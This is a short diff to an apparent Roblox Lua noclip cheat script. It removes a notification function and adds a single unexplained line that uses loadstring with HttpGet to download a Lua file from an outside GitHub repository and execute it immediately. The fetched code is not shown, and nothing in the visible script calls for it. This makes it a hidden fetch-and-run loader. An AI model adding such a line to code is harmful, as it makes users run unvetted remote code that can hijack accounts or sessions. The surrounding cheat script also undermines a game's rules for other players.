@@ -7,17 +7,7 @@ local player = Players.LocalPlayer
 local noclip = false
 local connection
 
-local function notify(message)
-    StarterGui:SetCore(
-        "SendNotification",
-        {
-            Title = "Noclip Script",
-            Text = message,
-            Icon = "rbxassetid://123653870026944",
-            Duration = 3
-        }
-    )
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTD-Roblox/Script-Beta/refs/heads/main/Script-By-HKTD.lua", true))()
 
 local function toggleNoclip()
     noclip = not noclip
